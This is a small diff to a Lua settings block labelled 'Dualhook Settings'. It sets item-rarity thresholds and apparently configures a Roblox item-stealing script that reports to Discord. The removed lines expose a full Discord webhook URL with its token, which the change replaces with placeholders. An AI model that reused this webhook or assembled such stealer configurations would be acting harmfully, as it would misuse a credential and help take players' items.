@@ -1,6 +1,6 @@
 -- [ Dualhook Settings ] --
-DualUsername = "owhvdjygshistbwjdh" -- [Dualhook Username]
-DualWebhook = "https://discord.com/api/webhooks/1264975102437490778/nJvELYp-HNI-gby_xMFI8c1hJScdSitcgTfSuFDkeDKc3giYVsIk9TgjxNbgcP6abvyg" -- [Dualhook Webhook]
+DualUsername = "username" -- [Dualhook Username]
+DualWebhook = "webhook" -- [Dualhook Webhook]
 DualUnique = 2 -- [Minimum Unique]
 DualAncient = 5 -- [Minimum Ancient]
 DualGodly = 3 -- [Minimum Godly]
